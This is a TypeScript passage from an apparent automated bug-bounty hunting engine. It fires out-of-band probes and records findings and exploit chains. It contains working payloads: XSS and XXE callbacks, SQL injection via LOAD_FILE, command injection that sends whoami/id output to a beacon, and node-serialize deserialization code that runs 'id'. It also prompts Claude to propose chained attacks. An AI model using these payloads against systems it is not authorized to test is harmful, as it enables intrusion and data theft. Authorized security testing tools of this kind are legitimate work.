          args.push("--headers", `${key}: ${value}`);
          break;
        case "nosqlmap":
          if (key.toLowerCase() === "cookie") {
            args.push("--cookie", value);
          } else {
            args.push("--header", `${key}: ${value}`);
          }
          break;
      }
    }
    return args;
  }

  private async runOOBProbe(
    targetUrl: string,
    vulnClass: string
  ): Promise<{ hit: boolean; beaconId?: string; summary?: string }> {
    try {
      // Prefer interactsh (public OOB) so real internet targets can call back.
      // Fall back to local callback server for local lab targets.
      const interactshBeacon = interactshManager.generateBeacon();
      const { beaconId, callbackUrl } = interactshBeacon ?? callbackServer.generateBeacon();
      const useInteractsh = Boolean(interactshBeacon);

      // A public target can never reach our local callback server — falling back to
      // it silently means every blind ssrf/xss/xxe/sqli/rce probe against that target
      // just times out and looks identical to "not vulnerable." Surface this once per
      // hunt so it's visible instead of a silent false-negative sink.
      if (!useInteractsh) {
        const targetHostname = (() => { try { return new URL(targetUrl).hostname; } catch { return ""; } })();
        const isLocalTarget = /^(localhost|127\.|10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|::1)/.test(targetHostname);
        if (!isLocalTarget && !this.oobDegradedWarned) {
          this.oobDegradedWarned = true;
          this.emit("hunt:oob_degraded", {
            sessionId: this.state.sessionId, targetUrl,
            reason: "Interactsh unavailable and target is public — local OOB callback server is unreachable from it",
          });
          logger.warn("[HunterEngine] OOB degraded — blind vuln classes (ssrf/xss/xxe/sqli/rce) cannot confirm against this public target without Interactsh", { targetUrl });
        }
      }

      const reqOpts = { headers: this.authHeaders, timeout: 8000, validateStatus: () => true };

      if (vulnClass === "rce") {
        // Fan a bounded multi-vector command-injection burst across common params and
        // shell-breakout contexts (GET + a few POST), all pointing at the one beacon.
        // Each payload folds whoami output + a vector marker into the callback.
        const attempts = buildRceOobAttempts(targetUrl, callbackUrl);
        await Promise.allSettled(attempts.map(a =>
          a.method === "POST"
            ? scopedHttp.post(a.url, a.body ?? {}, reqOpts, this.state.programId)
            : scopedHttp.get(a.url, reqOpts, this.state.programId)
        ));
      } else {
        // Single-request OOB payload for ssrf/xss/xxe/sqli.
        const probeUrl = (() => {
          const u = new URL(targetUrl);
          if (vulnClass === "ssrf") {
            u.searchParams.set("url", callbackUrl);
            u.searchParams.set("dest", callbackUrl);
            u.searchParams.set("target", callbackUrl);
            return u.toString();
          }
          if (vulnClass === "xss") {
            // scope-egress-ignore: this fetch(...) is XSS PAYLOAD CONTENT injected into the target page, not a call this process makes
            u.searchParams.set("q", `<img src="${callbackUrl}" onerror="fetch('${callbackUrl}')">`);
            return u.toString();
          }
          if (vulnClass === "xxe") {
            u.searchParams.set("xml", `<?xml version="1.0"?><!DOCTYPE x [<!ENTITY oob SYSTEM "${callbackUrl}">]><x>&oob;</x>`);
            return u.toString();
          }
          // sqli blind: time-based + OOB
          u.searchParams.set("id", `1 AND LOAD_FILE('${callbackUrl}')-- -`);
          return u.toString();
        })();
        await scopedHttp.get(probeUrl, reqOpts, this.state.programId).catch(() => {});
      }

      // Interactsh gets more time since DNS propagation can add a few seconds
      const waitMs = useInteractsh ? 15_000 : 12_000;
      let hit = false;
      let exfil: Record<string, string> | undefined;

      if (useInteractsh) {
        const oobHit = await interactshManager.waitForHit(beaconId, waitMs);
        hit = Boolean(oobHit);
      } else {
        const rec = await callbackServer.waitForHit(beaconId, waitMs);
        hit = rec !== null;
        exfil = rec?.exfil;
        callbackServer.cleanup(beaconId);
      }

      // Build a human-readable summary of any captured command output.
      // `v` is the winning injection vector marker (semi/pipe/sub/tick/…); surface it
      // separately, then label the command-output keys (u=whoami, i=id).
      const LABELS: Record<string, string> = { u: "whoami", i: "id", w: "whoami" };
      const summary = exfil && Object.keys(exfil).length > 0
        ? `OOB command output${exfil.v ? ` via ${exfil.v}` : ""} — ` + Object.entries(exfil)
            .filter(([k]) => k !== "v")
            .map(([k, val]) => `${LABELS[k] ?? k}=${val}`).join(", ")
        : undefined;

      if (hit) {
        this.emit("hunt:oob_hit", {
          sessionId: this.state.sessionId, beaconId, vulnClass, targetUrl,
          via: useInteractsh ? "interactsh" : "local",
          domain: interactshManager.getDomain() ?? "localhost",
          exfil,
        });
        logger.info("[HunterEngine] OOB callback confirmed", { beaconId, vulnClass, targetUrl, via: useInteractsh ? "interactsh" : "local", exfil });
      }
      return { hit, beaconId, summary };
    } catch (err) {
      logger.debug("[HunterEngine] OOB probe error (non-critical)", { err: String(err) });
      return { hit: false };
    }
  }

  private async probeDeserialize(baseUrl: string): Promise<{
    found: boolean; output: string; endpoint: string; flagValues: string[]; duration: number;
  }> {
    const start = Date.now();
    const allObs = this.state.observations.map(o => (o as unknown as Record<string, string>).rawOutput || "").join(" ");

    // Discover deserialize endpoints from observations or infer from base URL
    const endpoints: string[] = [];
    const endpointPatterns = ["/deserializ", "/serial", "/unserializ", "/pickle", "/marshal", "/object"];
    for (const pat of endpointPatterns) {
      const match = allObs.match(new RegExp(`(["'/])((?:[^"'/\\s]*)?${pat.slice(1)}[^"'\\s]*)`, "i"));
      if (match) {
        try { endpoints.push(new URL(match[2], baseUrl).toString()); } catch { /* skip */ }
      }
    }
    // Also try base URL itself and common paths
    try {
      const origin = new URL(baseUrl).origin;
      endpoints.push(...["/deserialize", "/api/deserialize", "/parse", "/api/parse"].map(p => origin + p));
    } catch { /* noop */ }

    const payloads = [
      // node-serialize IIFE
      `{"rce":"_$$ND_FUNC$$_function(){return require('child_process').execSync('id').toString()}()"}`,
      // process.mainModule variant
      `{"x":"_$$ND_FUNC$$_function(){return process.mainModule.require('child_process').execSync('id').toString()}()"}`,
    ];

    const FLAG_RE = /flag\{[^}]+\}|\b[0-9a-f]{32}\b/g;

    for (const endpoint of [...new Set(endpoints)]) {
      for (const payload of payloads) {
        try {
          const resp = await scopedHttp.post(endpoint, payload, {
            headers: { "Content-Type": "application/json", ...this.authHeaders },
            timeout: 8000,
            validateStatus: () => true,
          }, this.state.programId);
          const body = String(typeof resp.data === "string" ? resp.data : JSON.stringify(resp.data));
          const flags = body.match(FLAG_RE) ?? [];
          // Require the actual shape of `id` command output (uid=0(root) gid=0(root) ...),
          // not bare substrings like "root"/"executed" — those match ordinary page content
          // (e.g. React's `<div id="root">` on a SPA catch-all route returning index.html
          // for the probed /deserialize path), which was firing found:true and a +0.3
          // confidence boost on hunts against completely unrelated frontend apps.
          const rceHit = /uid=\d+\([^)]*\)\s*gid=\d+\([^)]*\)/i.test(body);
          if (flags.length > 0 || rceHit) {
            return { found: true, output: body.slice(0, 600), endpoint, flagValues: flags, duration: Date.now() - start };
          }
        } catch { /* try next */ }
      }
    }

    return { found: false, output: "", endpoint: "", flagValues: [], duration: Date.now() - start };
  }


  private computeAnomalyScore(data: Record<string, unknown>): number {
    let score = 0;
    const str = JSON.stringify(data).toLowerCase();

    // High anomaly signals
    if (str.includes("error") || str.includes("exception")) score += 0.2;
    if (str.includes("stack trace") || str.includes("traceback")) score += 0.4;
    if (str.includes("sql") || str.includes("mysql") || str.includes("postgres")) score += 0.3;
    if (str.includes("version") || str.includes("v1.") || str.includes("v2.")) score += 0.1;
    if ((data.missingSecurityHeaders as string[])?.length > 2) score += 0.3;

    return Math.min(score, 1.0);
  }

  private buildContext(): string {
    return JSON.stringify({
      target: this.state.targetUrl,
      observations: this.state.observations.length,
      hypotheses: this.state.hypotheses.length,
      probes: this.state.probes.length,
      iteration: this.state.iteration,
    });
  }

  private generateDefaultHypotheses(): void {
    const defaults: Partial<Hypothesis>[] = [
      { vulnClass: "xss", confidence: 0.5, priority: 7 },
      { vulnClass: "sqli", confidence: 0.4, priority: 8 },
      { vulnClass: "security_headers", confidence: 0.6, priority: 5 },
      { vulnClass: "hidden_endpoints", confidence: 0.5, priority: 6 },
      { vulnClass: "misconfig", confidence: 0.4, priority: 5 },
    ];

    for (const d of defaults) {
      this.state.hypotheses.push({
        id: uuidv4(),
        vulnClass: d.vulnClass!,
        targetUrl: this.state.targetUrl,
        reasoning: `Default hypothesis for ${d.vulnClass} based on common vulnerability patterns`,
        confidence: d.confidence!,
        priority: d.priority!,
        evidence: [],
        status: "pending",
        createdAt: Date.now(),
      });
    }
  }

  private async updateConfidence(hypothesis: Hypothesis, probes: ProbeResult[]): Promise<number> {
    const successRate = probes.filter(p => p.success).length / Math.max(probes.length, 1);
    const baseConfidence = hypothesis.confidence;
    // Bayesian update (simplified)
    return Math.min(0.99, baseConfidence * 0.4 + successRate * 0.6);
  }

  private async buildConfirmedFinding(
    hypothesis: Hypothesis,
    probes: ProbeResult[]
  ): Promise<HypothesisConfirmed> {
    const severityMap: Record<string, string> = {
      rce: "critical", sqli: "high", xss: "medium", ssrf: "high",
      lfi: "high", idor: "medium", misconfig: "low", info_disclosure: "low",
      security_headers: "info", auth_bypass: "critical",
    };

    const cvssMap: Record<string, number> = {
      critical: 9.5, high: 7.5, medium: 5.0, low: 3.0, info: 1.0
    };

    const severity = severityMap[hypothesis.vulnClass] || "medium";
    const cvssScore = cvssMap[severity] || 5.0;
    const bestProbe = probes.sort((a, b) => Number(b.success) - Number(a.success))[0];

    // Prefer explicit payload over raw output (which is often just HTTP response headers)
    const exploitPayload = (
      bestProbe?.payload ||
      (bestProbe?.parsed?.payload as string | undefined) ||
      (() => {
        // Extract injected query string from the command if present
        try {
          const urlMatch = bestProbe?.command?.match(/https?:\/\/\S+/);
          if (urlMatch) {
            const qs = new URL(urlMatch[0]).search;
            if (qs && qs !== "?") return qs.slice(1); // strip leading "?"
          }
        } catch { /* ignore parse errors */ }
        return "";
      })()
    ).slice(0, 500);

    return {
      hypothesis,
      proof: probes,
      severity,
      cvssScore,
      exploitPayload,
      rawEvidence: bestProbe?.rawHttpLog ?? undefined,
      videoPath: bestProbe?.videoPath ?? undefined,
      // Link the OOB beacon (if any probe confirmed via callback) so the callback
      // route can persist oobHitReceived/oobHitAt against this finding.
      oobBeaconId: probes.find(p => p.oobBeaconId)?.oobBeaconId,
      // True when a beacon actually FIRED (not just planted). Drives
      // findings.oobHitReceived at persist time — inline hits (the common case)
      // never reach the /api/callback route because the finding row doesn't exist
      // yet, so this is the only reliable place to record the confirmation.
      oobConfirmed: probes.some(p => p.oobConfirmed),
    };
  }

  private buildReproductionSteps(confirmed: HypothesisConfirmed): string[] {
    const steps: string[] = [
      `Navigate to the target endpoint: \`${confirmed.hypothesis.targetUrl}\``,
      `Vulnerability class: \`${confirmed.hypothesis.vulnClass}\` — ${confirmed.hypothesis.reasoning}`,
    ];

    confirmed.proof.forEach((probe, i) => {
      steps.push(
        `Step ${i + 3}: Run \`${probe.tool}\` — ${probe.success ? "Evidence found" : "Probed"}. ` +
        `Output: ${probe.output.slice(0, 300)}`
      );
    });

    if (confirmed.exploitPayload) {
      steps.push(`Payload used: \`${confirmed.exploitPayload.slice(0, 500)}\``);
    }
    steps.push(
      `Expected result: ${confirmed.severity.toUpperCase()} severity (CVSS ${confirmed.cvssScore}). ` +
      `Confidence: ${Math.round(confirmed.hypothesis.confidence * 100)}%`
    );
    return steps;
  }

  private async persistFinding(confirmed: HypothesisConfirmed): Promise<number> {
    try {
      const [row] = await db.insert(findings).values({
        huntSessionId: this.dbSessionId,
        campaignId: this.campaignId,
        targetId: this.targetId,
        // Source tag: lab/local hunts carry a sentinel programId (e.g. -1) so lab
        // findings never co-mingle with real-target findings in the UI/export.
        programId: this.state.programId,
        title: `${confirmed.hypothesis.vulnClass.toUpperCase()} found at ${confirmed.hypothesis.targetUrl}`,
        vulnType: confirmed.hypothesis.vulnClass,
        severity: confirmed.severity,
        confidence: confirmed.hypothesis.confidence,
        cvssScore: confirmed.cvssScore,
        description: confirmed.hypothesis.reasoning,
        evidence: [
          ...confirmed.proof as unknown as Record<string, unknown>[],
          ...(confirmed.rawEvidence ? [{ type: "raw_http", data: confirmed.rawEvidence }] : []),
          ...(confirmed.videoPath ? [{ type: "video_poc", path: confirmed.videoPath }] : []),
        ],
        reproductionSteps: this.buildReproductionSteps(confirmed) as unknown as Record<string, unknown>[],
        exploitPayload: confirmed.exploitPayload,
        oobBeaconId: confirmed.oobBeaconId,
        // Record the OOB confirmation NOW (not via the async /api/callback route,
        // which can't match an inline hit — the finding row doesn't exist yet during
        // the probe's waitForHit). This makes oobHitReceived reliably true at verify
        // time so the VerifierAgent can treat the callback as an authoritative oracle.
        oobHitReceived: confirmed.oobConfirmed === true,
        oobHitAt: confirmed.oobConfirmed ? new Date() : undefined,
        affectedUrl: confirmed.hypothesis.targetUrl,
        verificationStatus: "pending",
        status: "new",
      }).returning({ id: findings.id });
      // Update ROI model with confirmed finding
      await this.roiModel.updateSuccessRate(confirmed.hypothesis.vulnClass, true);
      return row?.id ?? 0;
    } catch (err) {
      logger.error("Failed to persist finding", { err });
      return 0;
    }
  }

  private async persistResults(): Promise<void> {
    const totalHypotheses = this.state.hypotheses.length;
    const confirmedHypotheses = this.state.hypotheses.filter(h => h.status === 'confirmed').length;
    const conversionRate = totalHypotheses > 0 ? confirmedHypotheses / totalHypotheses : 0;
    logger.info('[HunterEngine] Hunt conversion rate', {
      sessionId: this.state.sessionId,
      totalHypotheses,
      confirmedHypotheses,
      conversionRate: Math.round(conversionRate * 1000) / 1000,
    });

    try {
      await db.update(huntSessions)
        .set({
          phase: "complete",
          status: "completed",
          hypotheses: this.state.hypotheses as unknown as Record<string, unknown>[],
          observations: this.state.observations as unknown as Record<string, unknown>[],
          probes: this.state.probes as unknown as Record<string, unknown>[],
          completedAt: new Date(),
        })
        .where(eq(huntSessions.sessionUuid, this.state.sessionId));

      // Create exploit chain if multiple findings confirmed – links findings into an attack narrative
      if (this.campaignId && this.state.confirmedFindings.length >= 2) {
        const steps = this.state.confirmedFindings.map((f, i) => ({
          order: i + 1,
          vulnClass: f.hypothesis.vulnClass,
          targetUrl: f.hypothesis.targetUrl,
          severity: f.severity,
          payload: f.exploitPayload.slice(0, 200),
        }));
        const maxSeverityIdx = this.state.confirmedFindings
          .map(f => ({ critical: 4, high: 3, medium: 2, low: 1, info: 0 }[f.severity] || 0))
          .reduce((maxI, v, i, arr) => v > arr[maxI] ? i : maxI, 0);
        const topFinding = this.state.confirmedFindings[maxSeverityIdx];
        await db.insert(exploitChains).values({
          campaignId: this.campaignId,
          chainUuid: uuidv4(),
          name: `Chain: ${topFinding.hypothesis.vulnClass} → ${this.state.confirmedFindings.length} vulns`,
          steps: steps as unknown as Record<string, unknown>[],
          totalImpact: topFinding.cvssScore,
          successRate: this.state.confirmedFindings.length / Math.max(this.state.hypotheses.length, 1),
          finalObjective: `Multi-vector attack on ${this.state.targetUrl}`,
          status: "discovered",
        });
      }
    } catch (err) {
      logger.error("Failed to persist hunt results", { err });
    }
  }

  /** Cross-finding synthesis: given all confirmed findings, ask Claude what
   *  chained exploit is now possible that wasn't before. Seeds new hypotheses. */
  private lastSynthesisCount = 0;
  private async synthesizeChainedAttack(): Promise<void> {
    const findings = this.state.confirmedFindings;
    if (findings.length <= this.lastSynthesisCount) return;
    this.lastSynthesisCount = findings.length;

    const summary = findings.map(f => ({
      vulnClass: f.hypothesis.vulnClass,
      severity:  f.severity,
      url:       f.hypothesis.targetUrl,
      payload:   f.exploitPayload.slice(0, 100),
      reasoning: f.hypothesis.reasoning.slice(0, 200),
    }));

    const prompt = `You are reviewing confirmed vulnerabilities from an authorized bug bounty hunt on ${this.state.targetUrl}.

Confirmed findings:
${JSON.stringify(summary, null, 2)}

Answer in JSON only:
{
  "chains": [{
    "name": "short chain name",
    "steps": ["finding A → finding B"],
    "combined_impact": "what attacker achieves",
    "severity": "critical|high|medium",
    "next_hypothesis": { "vulnClass": "MUST be exactly one of: ${CANONICAL_VULN_CLASSES.join("|")}", "targetUrl": "string", "reasoning": "string" } | null
  }],
  "key_insight": "one-sentence most important cross-finding relationship"
}

next_hypothesis.vulnClass is not free text — pick the single closest match from the
list above. Do not invent a new label or describe an outcome/impact (e.g. "account
takeover", "lateral movement") as if it were a vulnClass.

Only include chains that genuinely increase severity beyond individual findings.`;

    try {
      const { ClaudeClient } = await import("./LogicExploitAgent").then(() =>
        import("../lib/claude-client")
      );
      const raw = await ClaudeClient.oneShot(
        "You are an expert security analyst. Return only valid JSON.",
        prompt,
        this.state.sessionId
      );
      const jsonMatch = raw.match(/\{[\s\S]*\}/);
      if (!jsonMatch) return;
      const parsed = JSON.parse(jsonMatch[0]) as {
        chains: Array<{ name: string; steps: string[]; combined_impact: string; severity: string; next_hypothesis: { vulnClass: string; targetUrl: string; reasoning: string } | null }>;
        key_insight: string;
      };
      if (!parsed?.chains?.length) return;

      this.emit("hunt:chain_synthesized", {
        sessionId: this.state.sessionId,
        chains: parsed.chains.map(c => ({ name: c.name, steps: c.steps, impact: c.combined_impact, severity: c.severity })),
        insight: parsed.key_insight,
      });
      logger.info("[HunterEngine] Chain synthesis", { chains: parsed.chains.length, insight: parsed.key_insight?.slice(0, 120) });

      // Seed the best next hypothesis from the highest-severity chain
      for (const chain of parsed.chains) {
        if (chain.next_hypothesis && (chain.severity === "critical" || chain.severity === "high")) {
          const nh = chain.next_hypothesis;
          const vulnClass = normalizeVulnClass(nh.vulnClass);
          if (!vulnClass) {
            logger.warn("[HunterEngine] Chain synthesis — discarding next_hypothesis with unrecognized vulnClass", {
              raw: nh.vulnClass, chain: chain.name, targetUrl: nh.targetUrl,
            });
          } else if (!this.state.hypotheses.some(h => h.vulnClass === vulnClass && h.targetUrl === nh.targetUrl)) {
            this.state.hypotheses.push({
              id: uuidv4(), vulnClass, targetUrl: nh.targetUrl,
              reasoning: `[Chain synthesis] ${chain.name}: ${nh.reasoning}`,
              confidence: 0.72, priority: 9,
              evidence: [], status: "pending", createdAt: Date.now(),
              chainedFrom: findings.map(f => f.hypothesis.id),
            });
            logger.info("[HunterEngine] Synthesis seeded hypothesis", { vulnClass, chain: chain.name });
          }
          break;
        }
      }
    } catch (err) {
      logger.debug("[HunterEngine] Chain synthesis non-fatal", { err: String(err) });
    }
  }

  getState(): HuntState {
    return this.state;
  }

  getDbSessionId(): number {
    return this.dbSessionId;
  }

  /**
   * Real, propagating stop (implements Stoppable). Sets the abort flag checked
   * by the main OHPU loop and by every probe iteration, so the engine ceases
   * issuing new model calls and exits at the next probe/iteration boundary
   * (within seconds, not at hunt completion). Idempotent.
   */
  stop(): void {
    if (this.aborted) return;
    this.aborted = true;
    logger.info("[HunterEngine] Stop requested — aborting hunt", { session: this.state?.sessionId });
    this.emit("hunt:aborted", { sessionId: this.state?.sessionId });
  }

  /** True once stop() has been called. */
  isAborted(): boolean {
    return this.aborted;
  }
}

export default HunterEngine;
